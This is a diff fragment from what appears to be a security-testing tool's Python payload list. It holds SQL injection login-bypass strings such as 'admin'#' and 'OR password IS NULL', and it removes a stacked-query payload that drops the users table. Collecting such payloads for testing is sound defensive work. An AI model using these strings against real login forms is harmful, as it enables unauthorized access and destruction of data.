@@ -188,7 +188,6 @@ SQLI_LOGIN: List[Payload] = [
     {"type": "SQLI_LOGIN", "family": "comment_hash",        "payload": "admin'#"},
     {"type": "SQLI_LOGIN", "family": "wildcard_like",       "payload": "' OR username LIKE '%admin%'-- -"},
     {"type": "SQLI_LOGIN", "family": "null_pass",           "payload": "' OR password IS NULL-- -"},
-    {"type": "SQLI_LOGIN", "family": "stacked_query",       "payload": "'; DROP TABLE users-- -"},
 ]
 
 #  특수 컨텍스트 
